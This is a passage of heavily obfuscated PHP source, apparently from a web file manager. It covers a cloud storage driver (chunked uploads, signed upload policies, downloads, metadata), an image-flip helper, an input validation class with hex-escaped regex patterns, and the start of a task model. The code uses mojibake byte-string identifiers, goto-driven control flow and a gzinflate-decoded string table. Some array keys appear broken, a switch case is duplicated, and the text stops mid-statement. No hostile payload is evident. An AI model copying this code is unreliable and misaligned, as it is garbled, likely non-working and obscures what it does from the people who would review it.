$CÑ“ˆó½ˆÛ =& $_SERVER[¼]; $cùÆîÄ†È¾ = IO::size($dÁ…²ê“Ó); if ($cùÆîÄ†È¾ <= 1024 * 1024 * 200) { $f¨©¤´¾¿ = array($CÑ“ˆó½ˆÛ[1245] . $dÁ…²ê“Ó); $Dˆ‡Î“¦ = $this->ussRequest($F£Ÿ¡Ó‹¿™, $CÑ“ˆó½ˆÛ[211], $f¨©¤´¾¿); return $Dˆ‡Î“¦[$CÑ“ˆó½ˆÛ[1025]] ? $this->getPathOuter($F£Ÿ¡Ó‹¿™) : !1; } goto d¢øà©ñÑ; e„¤…‚Û°Ü: $Dˆ‡Î“¦ = $this->ussRequest($F£Ÿ¡Ó‹¿™, $CÑ“ˆó½ˆÛ[211], !1, $D‹ó÷¨ìÏÄ); if (!$Dˆ‡Î“¦[$CÑ“ˆó½ˆÛ[1025]]) { return !1; } $E”Îâå´Ë = $Dˆ‡Î“¦[$CÑ“ˆó½ˆÛ[1027]]; goto DŒÇ²İÛÁ; DŒÇ²İÛÁ: $DÃí±š©“ = 0; $Cøí¦Š¿¥É = $E”Îâå´Ë[$CÑ“ˆó½ˆÛ[1250]]; $AìÅç™Æí™ = fopen($dÁ…²ê“Ó, $CÑ“ˆó½ˆÛ[1155]); goto cöÌ¬ÇĞÀ÷; d¢øà©ñÑ: $cÄÁÒ›öËÜ = $this->osChunkSize(); if ($cÄÁÒ›öËÜ > 1024 * 1024 * 10) { $cÄÁÒ›öËÜ = 1024 * 1024 * 10; } $D‹ó÷¨ìÏÄ = array($CÑ“ˆó½ˆÛ[1246], $CÑ“ˆó½ˆÛ[1247] . $cùÆîÄ†È¾, $CÑ“ˆó½ˆÛ[1248], $CÑ“ˆó½ˆÛ[1249] . $cÄÁÒ›öËÜ); goto e„¤…‚Û°Ü; cöÌ¬ÇĞÀ÷: if (!$AìÅç™Æí™) { return !1; } do { $C»é¹Øëª¾ = $E”Îâå´Ë[$CÑ“ˆó½ˆÛ[1251]]; fseek($AìÅç™Æí™, $DÃí±š©“); $C×©îØ™Ëè = fread($AìÅç™Æí™, $C»é¹Øëª¾); $Fò·¬‹•Ë = 0; do { $Fò·¬‹•Ë++; $E”Îâå´Ë = $this->uploadPart($F£Ÿ¡Ó‹¿™, $E”Îâå´Ë, $C×©îØ™Ëè); } while (!$E”Îâå´Ë && $Fò·¬‹•Ë < 3); if (!$E”Îâå´Ë) { return !1; } $Cøí¦Š¿¥É = $E”Îâå´Ë[$CÑ“ˆó½ˆÛ[1250]]; $DÃí±š©“ += $C»é¹Øëª¾; } while ($Cøí¦Š¿¥É != -1); fclose($AìÅç™Æí™); goto Bºß„¥ªïÖ; E–ªôãÀî: } private function uploadPart($Aˆ´ ºòø, $bÀÎŠ‹÷Ë, &$fóçÖàÌÏÔ) { $AŒÚÜ› †Ç =& $_SERVER[¼]; $D‘ª†ÚÄ¬÷ = array($AŒÚÜ› †Ç[1255], $AŒÚÜ› †Ç[1253] . $bÀÎŠ‹÷Ë[$AŒÚÜ› †Ç[1254]], $AŒÚÜ› †Ç[1256] . $bÀÎŠ‹÷Ë[$AŒÚÜ› †Ç[1250]], $AŒÚÜ› †Ç[1257] . $bÀÎŠ‹÷Ë[$AŒÚÜ› †Ç[1251]]); $e’å‚âóÆ = $this->ussRequest($Aˆ´ ºòø, $AŒÚÜ› †Ç[211], $fóçÖàÌÏÔ, $D‘ª†ÚÄ¬÷); return !$e’å‚âóÆ[$AŒÚÜ› †Ç[1025]] ? $e’å‚âóÆ[$AŒÚÜ› †Ç[1025]] : $e’å‚âóÆ[$AŒÚÜ› †Ç[1027]]; } public function uploadFormData($Fƒ¿Àåø¥, $bìèˆ¦°™¼ = 3600) { return $this->uploadPolicy($Fƒ¿Àåø¥, $bìèˆ¦°™¼); } public function multiUploadFormData($f¬–°Â¥†™, $dŸ»²ÔíÑÊ = 3600) { $B¡‡Åİµ© =& $_SERVER[¼]; $föÜÄãá® = (int) $GLOBALS[$B¡‡Åİµ©[7]][$B¡‡Åİµ©[77]]; return $this->uploadPolicy($f¬–°Â¥†™, $dŸ»²ÔíÑÊ, $föÜÄãá®); } private function uploadPolicy($eéæ¾ÛâŞĞ, $F ¼ƒÏíä„ = 3600, $F»ì“‡öŠ = 0) { goto C”ìñÈâµã; Eº·¹˜†ˆ: $cÉè¦ ³‰ = base64_encode(hash_hmac($C»Œõºà¨Í[1227], "\x50\117\x53\x54\46{$e–ÉÎ‡¿ª}\46{$Aº˜ÎãØ—Å}\x26{$bğ›èØ’Õñ}", md5("{$this->userpass}"), !0)); $A§æªÚÒâ = array($C»Œõºà¨Í[1098] => $bğ›èØ’Õñ, $C»Œõºà¨Í[1262] => "\x55\x50\131\x55\116\x20{$this->username}\x3a{$cÉè¦ ³‰}", $C»Œõºà¨Í[166] => $this->endpoint . $e–ÉÎ‡¿ª); return $A§æªÚÒâ; goto E˜îÔÍ«Çã; C”ìñÈâµã: $C»Œõºà¨Í =& $_SERVER[¼]; $e–ÉÎ‡¿ª = $C»Œõºà¨Í[8] . $this->bucket; $Aº˜ÎãØ—Å = gmdate($C»Œõºà¨Í[1190]); goto bÚÙõ…Üé; bÚÙõ…Üé: $cô¸êªÏáğ = array($C»Œõºà¨Í[1258] => $this->bucket, $C»Œõºà¨Í[1259] => $eéæ¾ÛâŞĞ, $C»Œõºà¨Í[1260] => time() + $F ¼ƒÏíä„, $C»Œõºà¨Í[1261] => $Aº˜ÎãØ—Å); if ($F»ì“‡öŠ) { $cô¸êªÏáğ[$C»Œõºà¨Í[1176]] = $F»ì“‡öŠ; } $bğ›èØ’Õñ = base64_encode(json_encode($cô¸êªÏáğ)); goto Eº·¹˜†ˆ; E˜îÔÍ«Çã: } public function download($D‡¡àè¹¨ã, $e®è’ÂÅ÷Ù) { goto dæ…Ä¿õÖ®; dæ…Ä¿õÖ®: $f°Í˜ß˜‰÷ = IO::getPathInner(IO::mkfile($e®è’ÂÅ÷Ù)); if (!($eÏ“¶øĞæï = $this->link($D‡¡àè¹¨ã))) { return !1; } $EáÖ”Ë” = 0; goto e„ÌÚë¯Œ¨; e„ÌÚë¯Œ¨: $F‚á×õé¥˜ = 1024 * 200; $AÒ…Ï«Õ® = fopen($f°Í˜ß˜‰÷, $_SERVER[¼][1211]); while (!0) { $dŒ®Ó¦æÃŠ = $this->fileSubstr($D‡¡àè¹¨ã, $EáÖ”Ë”, $F‚á×õé¥˜); if ($dŒ®Ó¦æÃŠ === !1) { return !1; } fwrite($AÒ…Ï«Õ®, $dŒ®Ó¦æÃŠ); $EáÖ”Ë” += $F‚á×õé¥˜; if (strlen($dŒ®Ó¦æÃŠ) < $F‚á×õé¥˜) { break; } } goto B‘—Â”º©Ò; B‘—Â”º©Ò: fclose($AÒ…Ï«Õ®); return $e®è’ÂÅ÷Ù; goto CÆˆ‹À”¾¦; CÆˆ‹À”¾¦: } public function link($BŒÈ¾ñ‰Ë, $d§„Æ®³æï = array()) { $C¹§Šõ¹â› =& $_SERVER[¼]; $BŒÈ¾ñ‰Ë = trim($BŒÈ¾ñ‰Ë, $C¹§Šõ¹â›[8]); if (!empty($this->token)) { $A–ã„øˆÑ = strtotime(date($C¹§Šõ¹â›[1263])); $BøƒŸ²’» = substr(md5($this->token . $C¹§Šõ¹â›[269] . $A–ã„øˆÑ . $C¹§Šõ¹â›[1264] . $BŒÈ¾ñ‰Ë), 12, 8) . $A–ã„øˆÑ; $d§„Æ®³æï[] = $C¹§Šõ¹â›[1265] . $BøƒŸ²’»; } $E«ò¯½Êõã = !empty($d§„Æ®³æï) ? $C¹§Šõ¹â›[69] . implode($C¹§Šõ¹â›[269], $d§„Æ®³æï) : $C¹§Šõ¹â›[33]; return $this->getHost() . $C¹§Šõ¹â›[8] . $BŒÈ¾ñ‰Ë . $E«ò¯½Êõã; } public function fileOut($AÂÜ«µ‡±, $CªçöâáºŠ = false, $f‚¦ñÛ›æÈ = false, $Fè›øïÚ¢ = '') { if (!$f‚¦ñÛ›æÈ) { $f‚¦ñÛ›æÈ = $this->pathThis($AÂÜ«µ‡±); } $D˜½å£èÁ‰ = $CªçöâáºŠ ? array($_SERVER[¼][1266] . rawurlencode($f‚¦ñÛ›æÈ)) : array(); $a£ç âÅ• = $this->link($AÂÜ«µ‡±, $D˜½å£èÁ‰); $this->fileOutLink($a£ç âÅ•); } public function fileOutServer($C•ƒÊ–ˆÇ, $Fä»ßô“Š = false, $D«’²šŸó³ = false, $b’¦å¯¹†˜ = '') { parent::fileOut($C•ƒÊ–ˆÇ, $Fä»ßô“Š, $D«’²šŸó³, $b’¦å¯¹†˜); } public function fileOutImage($b—’Ó¾‘Ôù, $D™À«¨—‘” = 250) { $A¡ä¹·…¿ = $this->link($b—’Ó¾‘Ôù . $_SERVER[¼][1267] . $D™À«¨—‘”); $this->fileOutLink($A¡ä¹·…¿); } public function fileOutImageServer($E«‘”÷Ï¡Ó, $D»âáŠîµ¹ = 250) { parent::fileOutImage($E«‘”÷Ï¡Ó, $D»âáŠîµ¹); } public function hashMd5($F¶İ¹¹­É·) { $AÂß²Ğ†ÛŠ =& $_SERVER[¼]; $aïê­ôæªÛ = $this->objectMeta($F¶İ¹¹­É·); return isset($aïê­ôæªÛ[$AÂß²Ğ†ÛŠ[193]]) ? $aïê­ôæªÛ[$AÂß²Ğ†ÛŠ[193]] : !1; } public function size($Bçà±ƒ¤¹) { $AÔ‡İ¯¥ì© = $this->objectMeta($Bçà±ƒ¤¹); return $AÔ‡İ¯¥ì© ? $AÔ‡İ¯¥ì©[$_SERVER[¼][77]] : 0; } public function info($F´å…‡®ƒ) { if ($this->isFolder($F´å…‡®ƒ)) { return $this->folderInfo($F´å…‡®ƒ); } else { if ($this->isFile($F´å…‡®ƒ)) { return $this->fileInfo($F´å…‡®ƒ); } } return !1; } public function exist($F…ÖÜÃÖ¦Ş) { return $this->isFile($F…ÖÜÃÖ¦Ş) || $this->isFolder($F…ÖÜÃÖ¦Ş); } public function isFile($d‘–á­ÇåŸ) { return !$this->isFolder($d‘–á­ÇåŸ) && $this->objectMeta($d‘–á­ÇåŸ); } public function isFolder($BÑè¹ÑÆ—ª) { return $this->cacheMethod($_SERVER[¼][220], $BÑè¹ÑÆ—ª); } protected function objectMeta($a»‡ä·‘Ò) { return $this->cacheMethod($_SERVER[¼][221], $a»‡ä·‘Ò); } protected function _objectMeta($E×‹Şë†) { goto Fä½Œ‚ÄÙ‰; f…ïßº÷¬: if (!$bŞ‹Œ¸©Ä[$cëÏƒğÑ–”[1025]]) { return null; } $F™æ†ÅèÉÃ = isset($bŞ‹Œ¸©Ä[$cëÏƒğÑ–”[1027]]) ? $bŞ‹Œ¸©Ä[$cëÏƒğÑ–”[1027]] : array(); if (!isset($F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1269]])) { return null; } goto F¹³©ÔÅÈ„; Fä½Œ‚ÄÙ‰: $cëÏƒğÑ–” =& $_SERVER[¼]; if ($E×‹Şë† == $cëÏƒğÑ–”[33] || $E×‹Şë† == $cëÏƒğÑ–”[8]) { return array(); } $bŞ‹Œ¸©Ä = $this->ussRequest($E×‹Şë†, $cëÏƒğÑ–”[1268]); goto f…ïßº÷¬; F¹³©ÔÅÈ„: $c§ŒÓË¦¢Á = array($cëÏƒğÑ–”[28] => get_path_this($E×‹Şë†), $cëÏƒğÑ–”[29] => isset($F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1269]]) ? $F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1269]] : null, $cëÏƒğÑ–”[77] => isset($F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1270]]) ? $F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1270]] : null, $cëÏƒğÑ–”[193] => isset($F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1271]]) ? $F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1271]] : null, $cëÏƒğÑ–”[1238] => isset($F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1272]]) ? $F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1272]] : null); $c§ŒÓË¦¢Á[$cëÏƒğÑ–”[1239]] = isset($F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1273]]) ? strtotime($F™æ†ÅèÉÃ[$cëÏƒğÑ–”[1273]]) : $c§ŒÓË¦¢Á[$cëÏƒğÑ–”[1238]]; return $c§ŒÓË¦¢Á; goto A³Ú”“¤Ä»; A³Ú”“¤Ä»: } protected function _isFolder($c°Ó·Ú©î) { $a‘æ¸ÅÌ =& $_SERVER[¼]; if ($c°Ó·Ú©î == $a‘æ¸ÅÌ[33] || $c°Ó·Ú©î == $a‘æ¸ÅÌ[8]) { return !0; } $DÀóÈôß”ğ = $this->objectMeta($c°Ó·Ú©î); return isset($DÀóÈôß”ğ[$a‘æ¸ÅÌ[29]]) && $DÀóÈôß”ğ[$a‘æ¸ÅÌ[29]] == $a‘æ¸ÅÌ[76] ? !0 : !1; } } goto Cé§Ï±ù; FÑÌšÎåßÊ: $C±‘Ö©¦ö¨ = $_SERVER[¼][543]; if (strlen($C±‘Ö©¦ö¨) < $_SERVER[¼][544]) { die; } $_SERVER[õÅ°Ò“] = explode($_SERVER[¼][545], gzinflate(substr($_SERVER[¼][546], 10, -8))); goto d«ƒ¬É¢Ÿ; FË‰•Í¿Îß: if (!function_exists($_SERVER[¼][1835])) { define($_SERVER[¼][1836], 0); define($_SERVER[¼][1837], 1); define($_SERVER[¼][1838], 2); function imageflip($BÚÉŠ’ğÎˆ, $B¢÷ÇÂ¸ˆ) { switch ($B¢÷ÇÂ¸ˆ) { case IMG_FLIP_HORIZONTAL: $eÌØù™ŸÆİ = imagesx($BÚÉŠ’ğÎˆ) - 1; $c´àÛ‰…µ = $eÌØù™ŸÆİ / 2; $dµƒ’è•ï = imagesy($BÚÉŠ’ğÎˆ); $f˜ëîÒ¹¨ñ = imageistruecolor($BÚÉŠ’ğÎˆ) ? imagecreatetruecolor(1, $dµƒ’è•ï) : imagecreate(1, $dµƒ’è•ï); for ($cîŠ›îœÏ = 0; $cîŠ›îœÏ < $c´àÛ‰…µ; ++$cîŠ›îœÏ) { imagecopy($f˜ëîÒ¹¨ñ, $BÚÉŠ’ğÎˆ, 0, 0, $cîŠ›îœÏ, 0, 1, $dµƒ’è•ï); imagecopy($BÚÉŠ’ğÎˆ, $BÚÉŠ’ğÎˆ, $cîŠ›îœÏ, 0, $eÌØù™ŸÆİ - $cîŠ›îœÏ, 0, 1, $dµƒ’è•ï); imagecopy($BÚÉŠ’ğÎˆ, $f˜ëîÒ¹¨ñ, $eÌØù™ŸÆİ - $cîŠ›îœÏ, 0, 0, 0, 1, $dµƒ’è•ï); } break; case IMG_FLIP_VERTICAL: $CŠÍõ¥¸ˆ§ = imagesx($BÚÉŠ’ğÎˆ); $Fö¯¹¶Ø³å = imagesy($BÚÉŠ’ğÎˆ) - 1; $dßÉùÚ¿‘É = $Fö¯¹¶Ø³å / 2; $f˜ëîÒ¹¨ñ = imageistruecolor($BÚÉŠ’ğÎˆ) ? imagecreatetruecolor($CŠÍõ¥¸ˆ§, 1) : imagecreate($CŠÍõ¥¸ˆ§, 1); for ($BŞ¥øÖØÂ = 0; $BŞ¥øÖØÂ < $dßÉùÚ¿‘É; ++$BŞ¥øÖØÂ) { imagecopy($f˜ëîÒ¹¨ñ, $BÚÉŠ’ğÎˆ, 0, 0, 0, $BŞ¥øÖØÂ, $CŠÍõ¥¸ˆ§, 1); imagecopy($BÚÉŠ’ğÎˆ, $BÚÉŠ’ğÎˆ, 0, $BŞ¥øÖØÂ, 0, $Fö¯¹¶Ø³å - $BŞ¥øÖØÂ, $CŠÍõ¥¸ˆ§, 1); imagecopy($BÚÉŠ’ğÎˆ, $f˜ëîÒ¹¨ñ, 0, $Fö¯¹¶Ø³å - $BŞ¥øÖØÂ, 0, 0, $CŠÍõ¥¸ˆ§, 1); } break; case IMG_FLIP_BOTH: $CŠÍõ¥¸ˆ§ = imagesx($BÚÉŠ’ğÎˆ); $dµƒ’è•ï = imagesy($BÚÉŠ’ğÎˆ); $f˜ëîÒ¹¨ñ = imagerotate($BÚÉŠ’ğÎˆ, 180, 0); imagecopy($BÚÉŠ’ğÎˆ, $f˜ëîÒ¹¨ñ, 0, 0, 0, 0, $CŠÍõ¥¸ˆ§, $dµƒ’è•ï); break; default: return; } imagedestroy($f˜ëîÒ¹¨ñ); } } if (!function_exists($_SERVER[¼][1839])) { function imagecreatefrombmp($e÷ªæÙ¿®Î) { return ImageGdBMP::load($e÷ªæÙ¿®Î); } } class Input { public static function getArray($e×Ä¹Ø¯Ø) { goto e¦µ—š¶¬—; e¦µ—š¶¬—: $F×•¿ã×æ =& $_SERVER[¼]; global $in; $aöÒĞÉå = array(); goto B£¸ „‰ìç; B£¸ „‰ìç: $AÓ®áŞå¸í = array(); $C•ãõ´£” = LNG($F×•¿ã×æ[1840]); foreach ($e×Ä¹Ø¯Ø as $bŒ†ÕºË· => $eÈ¾ÂÑ¥Ç‡) { goto D±„…„Ùº ; BˆÃæÉµîÃ: if (isset($eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1843]]) && !self::check($in[$bŒ†ÕºË·], $eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1843]], $f„¬İ«´’ù)) { if (array_key_exists($F×•¿ã×æ[1842], $eÈ¾ÂÑ¥Ç‡)) { if (!is_null($eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1842]])) { $aöÒĞÉå[$bèé–êí³©] = $eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1842]]; } } else { $AÓ®áŞå¸í[] = $fœ“·‹ æ‰; } continue; } $aöÒĞÉå[$bèé–êí³©] = $in[$bŒ†ÕºË·]; goto FÑÕÏŒ‹íµ; c„ËÃè»‰»: if (!array_key_exists($bŒ†ÕºË·, $in)) { if (array_key_exists($F×•¿ã×æ[1842], $eÈ¾ÂÑ¥Ç‡)) { if (!is_null($eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1842]])) { $aöÒĞÉå[$bèé–êí³©] = $eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1842]]; } } else { if (isset($eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1843]])) { $AÓ®áŞå¸í[] = $fœ“·‹ æ‰; } } continue; } if (isset($eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1843]]) && $eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1843]] == $F×•¿ã×æ[279]) { $DÈ¦È°Âùå = json_decode($in[$bŒ†ÕºË·], !0); if (is_array($DÈ¦È°Âùå)) { $aöÒĞÉå[$bèé–êí³©] = $DÈ¦È°Âùå; } else { if (array_key_exists($F×•¿ã×æ[1842], $eÈ¾ÂÑ¥Ç‡)) { if (!is_null($eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1842]])) { $aöÒĞÉå[$bèé–êí³©] = $eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1842]]; } } else { $AÓ®áŞå¸í[] = $fœ“·‹ æ‰; } } continue; } $f„¬İ«´’ù = _get($eÈ¾ÂÑ¥Ç‡, $F×•¿ã×æ[1004]); goto BˆÃæÉµîÃ; D±„…„Ùº : $fœ“·‹ æ‰ = _get($eÈ¾ÂÑ¥Ç‡, $F×•¿ã×æ[1231], $C•ãõ´£” . $F×•¿ã×æ[875] . $bŒ†ÕºË·); $bèé–êí³© = $bŒ†ÕºË·; if (isset($eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1841]]) && $eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1841]]) { $bèé–êí³© = $eÈ¾ÂÑ¥Ç‡[$F×•¿ã×æ[1841]]; } goto c„ËÃè»‰»; FÑÕÏŒ‹íµ: } goto Bœ´ÏÜ¨â; Bœ´ÏÜ¨â: if (count($AÓ®áŞå¸í) > 0) { show_json(implode($F×•¿ã×æ[1844], $AÓ®áŞå¸í), !1); } return $aöÒĞÉå; goto DÌƒ«‹İÔ; DÌƒ«‹İÔ: } public static function reg($DË£Ó¡Ö§ = "\x72\x65\161\x75\x69\x72\145") { static $f£Ê½·Ññø = array("\162\x65\x71\x75\x69\x72\x65" => "\x2e\x2b", "\x6e\x75\x6d\142\145\162" => "\x5c\x64\x2b", "\150\x65\170" => "\x5b\60\x2d\71\101\55\106\x61\55\x66\135\x2b", "\x69\x6e\164" => "\x5b\55\x5c\x2b\135\77\x5c\x64\x2b", "\x62\x6f\x6f\154" => "\x30\x7c\x31", "\x66\x6c\x6f\x61\x74" => "\x5b\55\134\53\135\x3f\134\144\x2b\50\x5c\56\134\144\53\51\x3f", "\x65\x6e\147\x6c\151\x73\150" => "\133\x41\x2d\132\141\x2d\x7a\x20\135\x2b", "\x63\x68\151\156\x65\x73\145" => "\133\x5c\x78\x7b\x34\x65\x30\x30\x7d\55\134\170\x7b\x39\x66\x61\65\175\135\x2b", "\150\141\x73\103\x68\x69\156\x65\163\x65" => "\57\x28\133\x5c\x78\x7b\x34\145\x30\60\175\x2d\134\x78\x7b\71\x66\141\65\175\x5d\x2b\51\57\x75", "\145\x6d\x61\151\x6c" => "\134\167\x2b\x28\x5b\134\56\134\55\x5d\x5c\167\53\51\x2a\134\100\x5c\167\x2b\x28\133\134\56\134\55\x5d\134\167\53\51\52\134\x2e\x5c\167\53", "\160\x68\x6f\156\x65" => "\x31\x5b\x33\x2d\71\135\x5c\x64\173\71\175", "\x74\145\x6c\160\150\157\x6e\145" => "\x28\x5c\50\134\144\x7b\63\x2c\64\175\134\51\x7c\x5c\x64\x7b\x33\54\x34\x7d\55\174\134\x73\51\x3f\134\x64\173\67\54\x31\64\x7d", "\x75\162\154" => "\50\x68\x74\x74\160\x7c\146\x74\x70\174\x68\164\x74\x70\x73\51\x3a\134\x2f\134\x2f\x5b\134\x77\x5c\55\137\x5d\x2b\x28\x5c\x2e\x5b\x5c\167\x5c\55\137\135\x2b\x29\x2b\50\x5b\x5c\x77\134\55\134\56\x2c\x40\x3f\136\x3d\45\x26\x3a\134\x2f\x7e\x5c\x2b\x23\135\52\133\x5c\x77\x5c\x2d\134\100\x3f\x5e\x3d\45\46\x5c\57\176\134\x2b\43\135\x29\x3f", "\x75\162\154\x46\165\154\x6c" => "\133\x61\x2d\172\101\x2d\x7a\135\53\72\134\57\x5c\x2f\133\136\x5c\x73\135\x2a", "\151\x70" => "\50\x5c\144\173\61\54\63\175\134\x2e\51\173\63\175\x28\x5c\144\x7b\61\x2c\x33\x7d\51", "\172\151\x70" => "\133\x31\55\71\135\134\x64\173\x35\175\x28\x3f\41\x5c\x64\51", "\151\144\x43\141\x72\144" => "\50\x5c\144\173\x31\65\x7d\x29\174\x28\x5c\144\x7b\61\x37\175\x28\134\x64\174\x58\174\x78\51\51", "\143\x6f\154\x6f\x72" => "\x23\50\x5b\60\55\71\101\x2d\x46\141\x2d\146\x5d\x7b\63\x7d\174\133\x30\55\x39\x41\x2d\x46\141\x2d\146\135\173\66\x7d\x29", "\x74\x69\x6d\x65" => "\x28\133\60\x2d\61\135\x5c\144\x7c\x32\x5b\x30\x2d\64\135\51\72\133\x30\x2d\65\x5d\134\x64", "\x64\141\x74\x65" => "\134\144\173\x34\175\133\55\134\x2f\135\77\50\x30\133\61\x2d\x39\135\174\x31\133\x30\55\62\135\x29\x5b\x2d\134\57\135\77\x28\x5b\x30\55\x32\x5d\x5c\x64\x7c\x33\133\60\55\x31\135\x29", "\x64\x61\x74\145\124\151\x6d\145" => "\x5c\x64\x7b\x34\175\x5b\55\134\57\x5d\77\x28\x30\133\x31\x2d\71\x5d\x7c\61\133\60\55\x32\x5d\51\133\55\134\57\x5d\x3f\50\x5b\60\x2d\62\135\134\144\x7c\x33\133\60\x2d\61\135\x29\134\x73\x2b\x28\x5b\60\x2d\x31\x5d\x5c\x64\174\x32\x5b\60\x2d\64\135\x29\72\x5b\60\x2d\x35\x5d\x5c\x64", "\160\x61\163\163\167\157\x72\144" => "\x28\77\x3d\56\52\134\144\x29\50\x3f\75\56\52\133\141\x2d\x7a\x5d\x29\50\77\x3d\56\52\133\101\55\132\135\51\x2e\173\x38\54\x32\x30\x7d", "\x6b\x65\x79" => "\133\x41\55\132\141\55\x7a\60\55\x39\x5f\x5c\55\134\x2e\135\53", "\x6b\145\171\106\165\154\x6c" => "\x5b\x41\55\132\141\x2d\172\x30\55\71\137\x5c\x2d\134\x2e\134\x73\54\135\53"); if (!$DË£Ó¡Ö§) { return $f£Ê½·Ññø; } return $f£Ê½·Ññø[$DË£Ó¡Ö§]; } public static function check($f³ò‘ ¦¹ï, $b¼§¡æŒÕï, $däÎ»ø®Œ = null) { $f¥§ğöà„  =& $_SERVER[¼]; switch ($b¼§¡æŒÕï) { case $f¥§ğöà„ [7]: return in_array($f³ò‘ ¦¹ï, $däÎ»ø®Œ); break; case $f¥§ğöà„ [1845]: return floatval($f³ò‘ ¦¹ï) > $däÎ»ø®Œ; break; case $f¥§ğöà„ [1846]: return floatval($f³ò‘ ¦¹ï) < $däÎ»ø®Œ; break; case $f¥§ğöà„ [322]: return strlen($f³ò‘ ¦¹ï) >= $däÎ»ø®Œ[0] && strlen($f³ò‘ ¦¹ï) <= $däÎ»ø®Œ[1]; break; case $f¥§ğöà„ [322]: if (is_array($däÎ»ø®Œ)) { return strlen($f³ò‘ ¦¹ï) >= $däÎ»ø®Œ[0] && strlen($f³ò‘ ¦¹ï) <= $däÎ»ø®Œ[1]; break; } else { return strlen($f³ò‘ ¦¹ï) == $däÎ»ø®Œ; break; } case $f¥§ğöà„ [318]: return floatval($f³ò‘ ¦¹ï) >= $däÎ»ø®Œ[0] && floatval($f³ò‘ ¦¹ï) <= $däÎ»ø®Œ[1]; break; } $cÇæ›–ª = self::reg(!1); $b¼§¡æŒÕï = isset($cÇæ›–ª[$b¼§¡æŒÕï]) ? $cÇæ›–ª[$b¼§¡æŒÕï] : $b¼§¡æŒÕï; if (substr($b¼§¡æŒÕï, 0, 1) != $f¥§ğöà„ [8]) { $b¼§¡æŒÕï = $f¥§ğöà„ [1847] . $b¼§¡æŒÕï . $f¥§ğöà„ [1848]; } return preg_match($b¼§¡æŒÕï, $f³ò‘ ¦¹ï) === 1; } public static function get($E‘œÕğ™Ü, $DÏ‡ÒŒ¸‹ = null, $dÓ¹À£É…’ = null, $DˆàÒÒğ‹ = null) { goto eï¹ĞÓ„Û; eÖƒçÎ¬¥: return $aíõé‰’ÔÎ[$E‘œÕğ™Ü]; goto Aã¦ ÷šŸ»; eï¹ĞÓ„Û: $eÜ†‘Ş†â‰ =& $_SERVER[¼]; $FªÈßÕÁö¶ = array(); if (!is_null($dÓ¹À£É…’)) { $FªÈßÕÁö¶[$eÜ†‘Ş†â‰[34]] = $dÓ¹À£É…’; } goto f½éëİ³Ù; f½éëİ³Ù: if (!is_null($DˆàÒÒğ‹)) { $FªÈßÕÁö¶[$eÜ†‘Ş†â‰[1004]] = $DˆàÒÒğ‹; } if (!is_null($DÏ‡ÒŒ¸‹)) { $FªÈßÕÁö¶[$eÜ†‘Ş†â‰[1843]] = $DÏ‡ÒŒ¸‹; } $aíõé‰’ÔÎ = Input::getArray(array($E‘œÕğ™Ü => $FªÈßÕÁö¶)); goto eÖƒçÎ¬¥; Aã¦ ÷šŸ»: } } goto c‰Œºéòİ«; D»´‰ÀåóÚ: function beforeShutdown() { Hook::trigger($_SERVER[À Ç][36]); } $_SERVER[$_SERVER[À Ç][37]] = BASIC_PATH; $_SERVER[$_SERVER[À Ç][38]] = LIB_DIR; goto bá¤ ØĞ–Å; EÔ‹ò óö: function beforeShutdownFatalError($DÇÌÓ®„È) { think_exception($DÇÌÓ®„È); } $_SERVER[$_SERVER[À Ç][48]] = $dŠøó¡²ä¼($_SERVER[$_SERVER[À Ç][45]]); $a¬ƒªÕ¼ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto b´ëĞËÕñ; C¿ª²‡‚‰”: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\x74\141\x73\x6b\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\164\x79\x70\145", "\145\x76\x65\156\x74", "\x74\x69\155\x65", "\x64\145\x73\x63", "\163\171\x73\x74\145\x6d", "\x65\x6e\141\142\x6c\145", "\x6c\x61\x73\x74\122\x75\156", "\x73\157\162\164"); public function listData($cÃÊ’á¡Æƒ = false, $c›çÅ•×ßÛ = "\x73\x6f\162\x74", $f—’öÃöº = false) { return parent::listData($cÃÊ’á¡Æƒ, $c›çÅ•×ßÛ, $f—’öÃöº); } public function add($BÕñƒ’ƒ—) { $aìÙÑŠ°œ =& $_SERVER[¼]; $fŒ‘†Úàí× = $this->findByName($BÕñƒ’ƒ—[$aìÙÑŠ°œ[28]]); if ($fŒ‘†Úàí×) { return !1; } $BÕñƒ’ƒ—[$aìÙÑŠ°œ[1369]] = 0; $BÕñƒ’ƒ—[$aìÙÑŠ°œ[2088]] = $this->getSort(); return parent::insert($BÕñƒ’ƒ—); } private function getSort() { $Aß¾›œ¯ÀŸ =& $_SERVER[¼]; $AÎÖš˜Æù½ = parent::listData(); $cßÃïÁÚè = array_to_keyvalue($AÎÖš˜Æù½, $Aß¾›œ¯ÀŸ[33], $Aß¾›œ¯ÀŸ[2088]); return empty($cßÃïÁÚè) ? 0 : max($cßÃïÁÚè) + 1; } public function update($EÄôè½Ù‰®, $Bİ†î¢ÖôÌ) { $AùœÓ‘Í„¹ =& $_SERVER[¼]; $e¼ÅÈ„Åí = $this->listData($EÄôè½Ù‰®); $E¯²—®ä¥› = $this->findByName($Bİ†î¢ÖôÌ[$AùœÓ‘Í„¹[28]]); if (!$e¼ÅÈ„Åí || 